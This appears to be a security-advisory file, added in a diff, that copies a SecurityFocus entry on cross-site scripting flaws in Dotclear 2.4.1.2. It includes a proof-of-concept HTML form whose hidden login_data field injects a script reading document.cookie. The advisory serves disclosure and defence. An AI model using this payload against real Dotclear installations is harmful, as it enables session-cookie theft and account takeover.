@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/52221/info
+
+Dotclear is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Dotclear 2.4.1.2 is vulnerable; prior versions may also be affected. 
+
+&lt;form action=&quot;http://www.example.com/admin/auth.php&quot; method=&quot;post&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;new_pwd&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;new_pwd_c&quot; value=&quot;2&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login_data&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
